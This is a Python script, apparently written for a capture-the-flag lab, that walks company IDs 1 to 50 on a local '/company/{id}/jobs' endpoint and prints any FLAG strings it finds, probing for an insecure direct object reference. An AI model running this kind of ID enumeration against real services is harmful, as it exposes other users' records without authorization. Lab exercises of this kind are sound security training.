import requests
import re
import time

TARGET_URL = "http://127.0.0.1:32945/company/{id}/jobs"
FLAG_PATTERN = re.compile(r'FLAG\{[^}]+\}')

found_flags = []
rate_limited = False
connection_error = False

print(f"[INFO] Starting enumeration of /company/{{id}}/jobs for IDs 1-50")
print("-" * 80)

# Use session for connection reuse
session = requests.Session()
session.headers.update({'User-Agent': 'Security-Research'})

for company_id in range(1, 51):
    if connection_error:
        print(f"[!] Stopping due to persistent connection issues")
        break
        
    url = TARGET_URL.format(id=company_id)
    
    try:
        # Add small delay to avoid overwhelming the server
        time.sleep(0.1)
        
        print(f"[*] Testing company ID: {company_id}", end="", flush=True)
        response = session.get(url, timeout=10)
        
        # Check for rate limiting
        if response.status_code == 429:
            print(f" -> [RATE LIMITED]")
            print(f"[!] Rate limited at company ID {company_id}. Stopping enumeration.")
            rate_limited = True
            break
            
        # Check for flags in response
        flags = FLAG_PATTERN.findall(response.text)
        
        if flags:
            print(f" -> [SUCCESS - FLAG FOUND]")
            print(f"\n[Details] Company ID: {company_id} | Status: {response.status_code}")
            print(f"[Response Body]:")
            print(response.text)
            print(f"\n[Extracted Flags]:")
            for flag in flags:
                print(f"  - {flag}")
            print("-" * 80)
            
            found_flags.append({
                'company_id': company_id,
                'status_code': response.status_code,
                'flags': flags,
                'response_body': response.text
            })
        else:
            print(f" -> Status: {response.status_code} | Size: {len(response.text)} bytes")
            
    except requests.exceptions.ConnectionError as e:
        print(f" -> [CONNECTION ERROR: {e}]")
        print(f"[!] Connection failed at company ID {company_id}")
        connection_error = True
        break
    except requests.exceptions.Timeout:
        print(f" -> [TIMEOUT]")
        print(f"[!] Request timed out at company ID {company_id}, continuing...")
        continue
    except Exception as e:
        print(f" -> [ERROR: {type(e).__name__}]")
        print(f"[!] Unexpected error at company ID {company_id}: {e}")
        continue

# Final summary
print("\n" + "=" * 80)
print("ENUMERATION COMPLETE")
print("=" * 80)
print(f"Total flags found: {len(found_flags)}")

if found_flags:
    print("\n[All Discovered Flags]:")
    for item in found_flags:
        for flag in item['flags']:
            print(f"  - Company ID {item['company_id']}: {flag}")

if rate_limited:
    print("\n[!] WARNING: Rate limiting detected. Some endpoints may not have been tested.")
if connection_error:
    print("\n[!] WARNING: Connection errors occurred. Enumeration may be incomplete.")
